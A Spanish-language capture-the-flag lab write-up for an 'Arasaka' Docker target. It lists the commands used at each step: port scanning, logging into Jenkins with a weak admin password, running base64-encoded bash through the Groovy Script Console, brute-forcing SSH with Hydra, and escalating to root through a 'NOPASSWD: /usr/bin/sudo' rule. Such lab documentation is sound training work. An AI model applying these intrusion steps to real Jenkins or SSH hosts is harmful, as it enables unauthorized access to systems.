# ARASAKA — Bitácora de análisis

**Objetivo:** `172.17.0.2` (contenedor Docker) — **Atacante:** Kali Linux (`172.17.0.1`)
**Hostname:** `arasaka` — **Base:** Ubuntu 22.04.5 LTS (jammy)
**Dificultad:** difícil (★★★★★☆☆☆, 5 pts) — **Bandera:** `/root/flag.txt`

---

## 1. Cronología

| Hora (local, -0600) | Acción | Resultado |
|---|---|---|
| 09:25 | `nmap -p-` y primeras peticiones web | 22, 80, 8080 y 38799 abiertos |
| 09:26–09:28 | `nmap -sV -sC` | Apache 2.4.52, OpenSSH 8.9p1, Jetty 10.0.20, Jenkins 2.452.4 |
| 09:28–09:29 | `gobuster` contra :80 y :8080 | Solo `index.html` y `server-status` (403); Jenkins exige login |
| 09:31 | Login `admin:admin123` | Sesión admin y `whoAmI` con rol `admin` |
| 09:31–09:33 | Script Console + `enum_jenkins.sh` | RCE como `uid=999(jenkins)`; usuarios y superficie enumerados |
| 09:35 | Prueba SSH temática | `vsaburo:arasaka` válida |
| 09:36 | Enumeración como `vsaburo` | Sin sudo, sin SUID custom, sin cron |
| 09:38 | Prueba SSH temática | `johnny:silverhand` válida |
| 09:38–09:46 | Hydra con wordlist temática | `netrunner:netrunner2077` |
| 09:48 | Acceso como `netrunner` | Home con `exploit/README.txt` (pista CVE) |
| 09:49 | `sudo -l` y versión de sudo | `(ALL) NOPASSWD: /usr/bin/sudo`; sudo 1.9.9-1ubuntu2.5 |
| 09:51 | `sudo -n /usr/bin/sudo -n id` | `uid=0(root)`; lectura de `/root/flag.txt` |
| 09:51–09:52 | Consulta a Canonical | Ubuntu 22.04 «Not affected» para CVE-2025-32463 (señuelo) |
| 09:53 | Validación con `startlab.sh` | «¡Felicitaciones! Has infiltrado Arasaka Tower.» |
| 09:57–09:58 | Limpieza de evidencias y capturas | 12 PNG generados en `docs/img/` |
| 10:19 | Segunda validación y captura real | `docs/img/13-validacion-real.png` (10:19:33 -0600) |

> El contenedor se recreó durante la validación. Las horas de las evidencias internas
> (`/home/...`, `ps`, logs) están en UTC; la tabla usa la hora local del atacante.

---

## 2. Reconocimiento

### 2.1 Puertos

```text
22/tcp    open  ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp    open  http         Apache httpd 2.4.52 (Ubuntu)
8080/tcp  open  http         Jetty 10.0.20 / Jenkins 2.452.4
38799/tcp open  unknown      Jenkins JNLP (JNLP4-connect, Ping)
```

`nmap` resuelve el objetivo como `metasploitable.vm` por una entrada heredada del entorno local;
`hostname` dentro del contenedor confirma `arasaka`. Se prioriza la evidencia interna.

### 2.2 Puerto 80

HTML estático de 3 068 bytes, sin formularios ni parámetros. Contiene los proyectos *SOULKILLER*,
*RELIC PROTOCOL* y *MIKOSHI DATABASE*, y un único enlace funcional a
`http://172.17.0.2:8080`. No hay `robots.txt`, `.git`, backups ni paneles ocultos.

**Decisión:** no perder tiempo con LFI/RCE web; el enlace de la portada es la pista de diseño.

### 2.3 Jenkins

- `GET /` → 403 con redirección a `/login`.
- Cabeceras: `X-Jenkins: 2.452.4`, `Server: Jetty(10.0.20)`.
- `whoAmI` anónimo → `authorities:["anonymous"]`, `allowAnonymousRead=false`.
- `robots.txt` → `Disallow: /`.
- El listener 38799 filtra `Jenkins-Version` y `Jenkins-Agent-Protocols`, pero no aporta un vector
  sin el secreto de agente. Se descarta.

**Decisión:** el único camino es autenticarse en el panel.

---

## 3. Acceso y RCE

### 3.1 Credencial

Se probó `admin:admin123`, la credencial de laboratorio más habitual. Aceptada. El panel no tiene
captcha, bloqueo por intentos ni MFA. `whoAmI` devuelve rol `admin`.

### 3.2 Script Console

`/script` permite Groovy arbitrario a un administrador. Es una función legítima, no una CVE. Para
evitar la interpolación de `$` en Groovy, el comando se codifica en base64 y se ejecuta con
`ProcessBuilder('/bin/bash','-c', "echo ... | base64 -d | /bin/bash")`.

Helper: `exploits/jenkins_rce.py` (login + crumb + POST + parseo del `<pre>`).

```text
uid=999(jenkins) gid=999(jenkins) groups=999(jenkins)
arasaka
Ubuntu 22.04.5 LTS
```

`/etc/passwd` revela: `netrunner` (1000), `johnny` (1001), `vsaburo` (1002), `takemura` (1003),
`jenkins` (999).

### 3.3 Contención de `jenkins`

| Comprobación | Resultado |
|---|---|
| Capabilities | `CapEff=0000000000000000` |
| `docker.sock` | No existe |
| Cron de usuario | No disponible |
| SUID/SGID | Solo binarios estándar |
| `sudo -n -l` | Pide contraseña; sin regla |
| `passwd -S jenkins` | `L` (bloqueada para SSH) |
| `sshd_config` | `PasswordAuthentication yes` |

**Decisión:** no insistir en escalada local desde `jenkins`; usar la enumeración para pivote SSH.

---

## 4. Pivote SSH

### 4.1 Wordlist

`wordlists/gen_wordlist.py` genera 1 582 contraseñas con vocabulario de *Cyberpunk 2077*: personajes,
empresas, proyectos y sufijos (`2077`, `2026`, `123`, `!`). Usuarios iniciales para Hydra:
`netrunner`, `takemura`.

```bash
hydra -L wordlists/arasaka_users.txt -P wordlists/arasaka_passwords.txt \
      -t 4 -I -o loot/hydra-ssh.txt ssh://172.17.0.2
```

Resultado: `netrunner:netrunner2077`. Sin Fail2Ban y con `PasswordAuthentication yes`, la prueba es
inmediata.

### 4.2 Pruebas temáticas dirigidas

A partir de la lista de contraseñas se probaron las cuentas restantes del `/etc/passwd`:

- `vsaburo:arasaka` — válida.
- `johnny:silverhand` — válida.
- `takemura` — no comprometida (no era necesaria).

`vsaburo` y `johnny` no tienen sudo. Se documentan como confirmación del patrón de contraseñas, no
como parte de la ruta crítica. La cuenta relevante es `netrunner`.

### 4.3 Home de `netrunner`

```text
/home/netrunner/exploit/README.txt
CVE-2025-32463 Research Directory
```

Pista deliberada. Se investiga y se descarta (§5.2).

---

## 5. Escalada

### 5.1 Regla de sudoers

```text
User netrunner may run the following commands on arasaka:
    (ALL) NOPASSWD: /usr/bin/sudo
```

La regla está en `/etc/sudoers`, no en `sudoers.d`.

```bash
sudo -n /usr/bin/sudo -n id
# uid=0(root) gid=0(root) groups=0(root)

sudo -n /usr/bin/sudo -n cat /root/flag.txt
# ARASAKA{sudo_chr00t_s0ulk1ll3r_n1ght_c1ty}
```

**Por qué funciona:** el `sudo` externo ejecuta `/usr/bin/sudo` como `root` sin contraseña. El
`sudo` interno ya corre con `euid=0`, por lo que no vuelve a evaluar la política de `netrunner` y
ejecuta cualquier comando como `root`. Es equivalente a `NOPASSWD: ALL`.

### 5.2 CVE-2025-32463 — descartada

- `sudo --version` → `1.9.9`; paquete `1.9.9-1ubuntu2.5`.
- Canonical: **Ubuntu 22.04 (jammy) «Not affected»** para CVE-2025-32463.
- El changelog instalado menciona CVE-2025-32462, no la 32463.
- `sudo -R` existe, pero no se usó ni era necesario.

**Decisión:** no ejecutar un exploit de chroot; la vía real es la regla `NOPASSWD`. El nombre de la
bandera (`chr00t`) es narrativo.

---

## 6. Validación

```bash
printf 'ARASAKA{sudo_chr00t_s0ulk1ll3r_n1ght_c1ty}\n' | bash startlab.sh arasaka.tar
```

```text
LAB: ARASAKA
DIFICULTAD: ★★★★★☆☆☆ difícil (5 puntos)
IP del laboratorio: 172.17.0.2

Ingresa la flag (formato ARASAKA{...}):
¡Felicitaciones! Has infiltrado Arasaka Tower.

FECHA Y HORA: 2026-10-21 09:53:02 -0600
```

El validador recrea el contenedor; las evidencias quedan en local. La segunda ejecución, capturada
en `docs/img/13-validacion-real.png`, fue aceptada a las **10:19:33 -0600** con la misma bandera.

---

## 7. Decisiones y descartes

| Decisión | Motivo |
|---|---|
| No inspeccionar la imagen Docker (`arasaka.tar`) | El análisis debía ser black-box por red |
| Tratar el puerto 80 como señuelo | Sin formularios, parámetros ni rutas ocultas |
| Descartar el listener 38799 | JNLP requiere secreto de agente; solo filtra versión |
| No buscar CVE de Jenkins | El acceso fue por credencial débil, no por vulnerabilidad de la versión |
| No escalar desde `jenkins` | Sin capabilities, `docker.sock`, cron ni sudo |
| Usar Hydra solo para `netrunner`/`takemura` | Eran los usuarios de la wordlist; el resto se probó manualmente |
| Descartar CVE-2025-32463 | Ubuntu 22.04 no afectado y el vector real es `sudoers` |
| No modificar ficheros del objetivo | La escalada es de solo lectura; no se dejó persistencia |

---

## 8. Evidencias

| Evidencia | Artefacto |
|---|---|
| Puertos y versiones | `recon/nmap-full.txt`, `recon/nmap-services.txt` |
| Portada y enlace a Jenkins | `recon/web-root.html`, `docs/img/02-web.png` |
| Login y `whoAmI` | `recon/jenkins-login.html`, `recon/jenkins-whoami.json` |
| RCE como `jenkins` | `loot/jenkins-id.txt`, `shots/captures/06_rce.txt` |
| Enumeración y contención | `loot/enum-jenkins.txt`, `loot/caps-jenkins.txt`, `loot/enum-pivot.txt` |
| Credenciales SSH | `loot/hydra-ssh.txt`, `shots/captures/08_*.txt` |
| Regla sudo | `loot/sudoers-y-version.txt`, `docs/img/07-sudo-l.png` |
| Root y bandera | `shots/captures/10_sudo_sudo.txt`, `loot/flag.txt` |
| CVE señuelo | `recon/cve-2025-32463-ubuntu.txt`, `docs/img/11-cve-decoy.png` |
| Validación | `loot/validacion.txt`, `loot/validacion-raw.txt` |

---

## 9. Checklist final

- [x] Reconocimiento completo de puertos y servicios
- [x] Acceso a Jenkins con credenciales débiles
- [x] RCE como `jenkins` y enumeración del sistema
- [x] Pivote SSH y obtención de `netrunner`
- [x] Identificación de la regla `NOPASSWD: /usr/bin/sudo`
- [x] Escalada a `root` y lectura de la bandera
- [x] Descarte razonado de CVE-2025-32463
- [x] Validación oficial con `startlab.sh`
- [x] Evidencias y capturas reproducibles
- [x] Documentación y estructura del repositorio
